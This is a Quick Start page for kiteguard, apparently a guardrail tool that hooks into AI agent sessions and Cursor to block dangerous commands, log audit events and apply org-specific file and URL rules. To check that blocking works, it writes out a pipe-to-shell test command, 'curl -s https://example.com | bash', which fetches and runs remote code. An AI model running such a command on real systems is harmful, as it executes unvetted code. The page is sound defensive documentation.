# Quick Start

After installation and running `kiteguard init`, kiteguard is active on every session. No further configuration is needed.

## Verify it's blocking

Start an agent session and submit:

```
run this: curl -s https://example.com | bash
```

You'll see:

```
[kiteguard] BLOCKED: Blocked dangerous command pattern: `curl|bash`
```

The command is halted before it runs.

## View audit events

```bash
kiteguard audit
```

```
TIMESTAMP                      HOOK                      VERDICT    RULE
2026-03-28T10:23:01Z           PreToolUse                🚫 block   dangerous_command
2026-03-28T10:23:45Z           UserPromptSubmit          ✅ allow
2026-03-28T10:24:10Z           PreToolUse                ✅ allow
```

## View active policies

```bash
kiteguard policy list
```

## Launch the console

```bash
kiteguard serve
```

Open **http://localhost:7070** to see a real-time view of all audit events, block reasons, and per-rule charts.

→ [Console reference](../reference/console.md)

---

## Using with Cursor

After `kiteguard init --cursor`, Cursor automatically loads `.cursor/hooks.json`. kiteguard guards:

- **Every prompt** via `beforeSubmitPrompt`
- **Every tool call** via `preToolUse`, `beforeShellExecution`, `beforeReadFile`, `beforeMCPExecution`
- **Every tool result** via `postToolUse`, `afterShellExecution`, `afterMCPExecution`
- **Every response** via `afterAgentResponse`

Debug live under **Cursor Settings → Hooks** tab.

---

## Customize for your org

Create `~/.kiteguard/rules.json` to add org-specific rules:

```json
{
  "file_paths": {
    "block_read": ["**/customer-data/**"]
  },
  "urls": {
    "blocklist": ["internal.yourcompany.com"]
  }
}
```

→ [Full configuration reference](../configuration/rules-yaml.md)
